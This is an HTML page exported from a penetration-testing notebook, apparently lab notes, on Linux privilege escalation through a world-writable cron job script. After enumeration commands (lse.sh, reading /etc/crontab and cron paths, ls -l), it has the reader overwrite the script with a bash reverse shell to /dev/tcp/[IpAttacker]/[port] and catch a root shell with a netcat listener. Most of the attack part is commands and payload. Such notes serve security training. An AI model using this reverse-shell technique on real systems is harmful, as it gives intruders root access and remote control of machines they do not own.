<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>File Permission misconfiguration</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>File Permission misconfiguration</h1><br/>0. <a href="entest--Post_Exploitation--Privilege_Escalation--Linux_Privilege_Escalation--Automated_Recon_with_Tools--Linux_Smart_Enumeration_(lse.sh).html">Linux Smart Enumeration(lse.sh)</a><br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ .<span style="color:#ff9d00;font-weight:700">/</span>lse.sh -l 1 -i <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">more</span></pre></div><br />    <a href=""><img src="images/1302-1.png" alt="images/1302-1.png" /></a><br />1. View the <span style="color:#1e90ff;">cronJobs</span> of the system-wide crontab:<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">cat</span> <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>crontab</pre></div><br />    if we cannot read /etc/crontab check also(automated tools like <a href="entest--Post_Exploitation--Privilege_Escalation--Linux_Privilege_Escalation--Automated_Recon_with_Tools--Linux_Smart_Enumeration_(lse.sh).html">lse.sh</a> anyway will do that for us):<br />      ▪ /etc/init.d<br />      ▪ /etc/cron*<br />      ▪ /etc/crontab<br />      ▪ /etc/cron.allow<br />      ▪ /etc/cron.d <br />      ▪ /etc/cron.deny<br />      ▪ /etc/cron.daily<br />      ▪ /etc/cron.hourly<br />      ▪ /etc/cron.monthly<br />      ▪ /etc/cron.weekly<br />      ▪ /etc/sudoers<br />      ▪ /etc/exports<br />      ▪ /etc/anacrontab<br />      ▪ /var/spool/cron<br />      ▪ /var/spool/cron/crontabs/root<br />      ▪ command: systemctl list-timers --all<br />       <a href=""><img src="images/1302-2.png" alt="images/1302-2.png" /></a><br />       The asterisks mean “every”. They refers to “minute”(m), “hour”(g), “day of month”(dom), “month”(mon), “days of week”(dow).<br />       These are the <span style="color:#1e90ff;">CronJobs</span>. <br />       In particular the last two are interesting because they run every minute<br />4. Locate the overwrite.sh file on the server<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">locate</span> &lt;cronJob&gt;</pre></div><br />    <a href=""><img src="images/1302-3.png" alt="images/1302-3.png" /></a><br />5. Check the file&#39;s permissions and hope that it is world writable<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">ls</span> -l &lt;cronJobBinary&gt;</pre></div><br />    <a href=""><img src="images/1302-4.png" alt="images/1302-4.png" /></a><br />    Yes! It is World writable<br />6. Replace the contents of the &lt;cronJobBinary&gt; file with the following:<br />   <div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#!/bin/bash</span><br /><span style="color:#ff9d00;font-weight:700">bash</span> -i &gt;<span style="color:#ff9d00;font-weight:700">&amp;</span> <span style="color:#ff9d00;font-weight:700">/</span>dev<span style="color:#ff9d00;font-weight:700">/</span>tcp<span style="color:#ff9d00;font-weight:700">/</span>[IpAttacker]<span style="color:#ff9d00;font-weight:700">/</span>[port] <span style="color:#ff9d00;font-weight:700">0&gt;&amp;</span>1</pre></div> <br />    <a href=""><img src="images/1302-5.png" alt="images/1302-5.png" /></a><br />    To do that you can use vim<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ vim &lt;cronJobBinary&gt;<br /><span style="color:#0088ff;font-weight:400"># i --&gt; insert</span><br /><span style="color:#0088ff;font-weight:400">#Esc --&gt; esc from insert</span><br /><span style="color:#0088ff;font-weight:400">#:w --&gt; write(save)</span><br /><span style="color:#0088ff;font-weight:400">#:q --&gt; exit</span></pre></div><br />7. Run a <span style="text-decoration:underline;">netcat</span> listener on your local machine and wait for the cron job to run.<br />    <div class="codebox"><pre>attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span>#  nc -nvlp 53</pre></div><br />     A reverse shell running as the root user should be caught:<br />    <a href=""><img src="images/1302-6.png" alt="images/1302-6.png" /></a></div>
</body>
</html>
